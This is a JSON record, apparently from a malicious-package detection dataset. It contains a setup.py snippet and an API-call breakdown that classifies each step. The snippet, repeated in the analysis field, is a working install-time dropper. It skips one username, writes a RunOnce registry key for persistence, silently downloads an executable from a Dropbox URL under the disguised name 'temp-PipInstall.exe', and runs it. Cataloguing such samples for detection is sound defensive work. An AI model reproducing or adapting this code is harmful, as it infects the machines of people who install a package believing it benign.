[
  {
    "pyfile": "setup.py",
    "code_snippet": "import os\nimport subprocess\n\nif os.getlogin() != \"Tahg\":\n  malwPath = os.environ['TEMP'] + \"\\\\temp-PipInstall.exe\"\n  try:\n    cPath = os.environ['WINDIR'] + \"\\\\System32\\\\curl.exe\"\n    subprocess.Popen(f'reg add \"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\" /v Pentestlab /t REG_SZ /d \"{malwPath}\"', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\n    subprocess.call([cPath, \"https://dl.dropboxusercontent.com/s/5mp5s3ta5skt5rv/esqueleDrp.exe?dl=0\", \"-o\", malwPath], shell=False, creationflags=subprocess.CREATE_NO_WINDOW).wait()\n    os.system(malwPath)\n  except: pass",
    "pattern_analysis": {
      "api_sequence": [
        "os.getlogin",
        "os.environ.__getitem__",
        "os.environ.__getitem__",
        "subprocess.Popen",
        "subprocess.call",
        "os.system"
      ],
      "api_sequence_with_args": [
        "os.getlogin()",
        "os.environ.__getitem__('TEMP')",
        "os.environ.__getitem__('WINDIR')",
        "subprocess.Popen('reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Pentestlab /t REG_SZ /d \"{malwPath}\"', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)",
        "subprocess.call([cPath, \"https://dl.dropboxusercontent.com/s/5mp5s3ta5skt5rv/esqueleDrp.exe?dl=0\", \"-o\", malwPath], shell=False, creationflags=subprocess.CREATE_NO_WINDOW).wait()",
        "os.system(malwPath)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.environ.__getitem__",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.environ.__getitem__",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "subprocess.call",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        }
      ],
      "contextual_code": "import os\nimport subprocess\n\nif os.getlogin() != \"Tahg\":\n  malwPath = os.environ['TEMP'] + \"\\\\temp-PipInstall.exe\"\n  try:\n    cPath = os.environ['WINDIR'] + \"\\\\System32\\\\curl.exe\"\n    subprocess.Popen(f'reg add \"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\" /v Pentestlab /t REG_SZ /d \"{malwPath}\"', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\n    subprocess.call([cPath, \"https://dl.dropboxusercontent.com/s/5mp5s3ta5skt5rv/esqueleDrp.exe?dl=0\", \"-o\", malwPath], shell=False, creationflags=subprocess.CREATE_NO_WINDOW).wait()\n    os.system(malwPath)\n  except: pass"
    }
  },
  {
    "metadata": {
      "package_name": "191239aa-10.87"
    }
  }
]